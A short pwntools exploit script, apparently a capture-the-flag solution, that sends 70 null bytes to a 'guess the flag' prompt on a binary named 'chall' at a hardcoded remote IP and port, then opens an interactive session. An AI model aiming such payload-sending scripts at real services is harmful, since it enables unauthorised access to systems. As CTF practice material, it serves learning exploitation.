from pwn import *

BIN = "./chall"
HOST = "34.146.101.4"
PORT =  30007
def exploit():
	payload = b"\x00"*70
	# _breakpoint="""
	# 	b*main+392
	# 	"""
	# gdb.attach(io,_breakpoint)
	io.recvuntil("guess the flag!> ")
	io.sendline(payload)
	io.interactive()

io = process(BIN)
io = remote(HOST,PORT)
context.log_level="debug"
exploit()